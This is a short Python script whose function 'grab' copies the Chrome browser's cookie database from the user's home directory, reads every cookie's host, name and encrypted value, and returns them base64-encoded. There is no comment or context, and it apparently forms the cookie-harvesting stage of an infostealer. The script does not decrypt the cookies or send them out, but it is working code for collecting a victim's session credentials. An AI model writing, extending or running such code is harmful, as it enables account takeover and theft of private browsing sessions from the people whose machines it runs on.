import os, shutil, sqlite3, base64
from pathlib import Path

def grab():
    cookies = []
    path = os.path.join(str(Path.home()), ".config", "google-chrome", "Default", "Cookies")
    if not os.path.exists(path): return cookies
    shutil.copy2(path, "cookies_tmp.sqlite")
    conn = sqlite3.connect("cookies_tmp.sqlite")
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
    for host_key, name, encrypted_value in cursor.fetchall():
        cookies.append({"host": host_key, "name": name, "value": base64.b64encode(encrypted_value).decode()})
    conn.close()
    os.remove("cookies_tmp.sqlite")
    return cookies